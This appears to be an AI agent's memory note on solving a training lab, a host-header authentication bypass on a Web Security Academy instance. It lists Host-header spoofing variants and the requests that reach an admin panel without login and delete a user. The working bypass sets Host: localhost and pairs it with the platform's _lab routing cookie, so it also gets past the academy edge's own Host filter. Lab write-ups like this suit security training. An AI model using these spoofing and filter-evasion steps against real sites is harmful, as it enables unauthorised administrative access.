---
metadata:
  node_type: memory
name: "Host Header Auth Bypass Lab Arm A"
description: "Host header auth bypass: Host localhost alone gets 403 from the edge; Host localhost plus the _lab cookie routes and grants admin"
last_updated: 2026-10-10T13:58:24+08:00
created: 2026-10-10T13:58:24+08:00
---

## lab-host-header-authentication-bypass (arm A, solved)

Instance: https://0a92003d03a1602580188ace007300a9.web-security-academy.net
lab id: 5A48933F3A964CB3A951FAD54ED62078C63E81E3FCD2DF74D5712DC626D14B50

Lab mechanism: /admin gate answers 401 "Admin interface only available to local users";
the privilege level is derived from the Host header, so the intended move is Host: localhost.

Platform obstacle (where the work was): the academy edge in front validates Host itself.
- Host = instance domain -> routed, app answers (200 root, 401 admin).
- Host = localhost / 127.0.0.1 / any IP spelling (127.0.0.2, 0177.0.0.1, 2130706433, 0x7f000001,
  [::1], 0, 127.0.0.1:80, LOCALHOST, localhost.localdomain, 127.0.0.1.nip.io, trailing space) -> 403
  "Client Error: Forbidden" (109 B, no Server header). The filter is semantic, not string-exact.
- Host = x.<instance> / <instance>. / localhost.<instance> -> 421 "Invalid host" (12 B).

Bypass: the edge also routes on the _lab cookie (value "<labnum>|<base64 java object>",
e.g. 46%7cMCwCFAXg...). Send BOTH Host: localhost and Cookie: _lab=<jar value>
=> GET /admin returns 200 with the panel, no login needed. Then
GET /admin/delete?username=carlos with the same Host header + jar, --follow
=> 302 -> /admin, "User deleted successfully!", banner is-solved + congrats.

Negative results, do not re-run:
- absolute-form request line (GET https://localhost/admin) + routable Host header -> still 401;
  the front-end does not take $host from the request line here.
- X-Forwarded-Host / X-Forwarded-Server / X-Host / X-Original-Host / Forwarded / X-Real-IP /
  Client-IP / True-Client-IP / X-Originating-IP -> no effect (401).
- duplicate Host headers -> 400 {"error":"Duplicate header names are not allowed"} from the edge.
- port 80: instance host -> 400 "This lab is not accessible over HTTP"; Host: localhost -> 308 to
  https://localhost/admin (dead end, resolves to our own box); Host: 127.0.0.1 -> 403.
- HTTP/2 with :authority=instance plus explicit Host: localhost -> GOAWAY (RFC 9113 mismatch).

Pieces: page_read (widget-lab-id), range_launch launch-url, raw_matrix (variant tables), raw_http
(verbatim headers), http_session (jar cookies + --header 'Host: localhost'), banner_verdict.

Lesson: when an academy lab's exploit needs a Host the edge refuses to route, the routing key is
the _lab cookie, not the Host; pair the forbidden Host with the jar's _lab value.

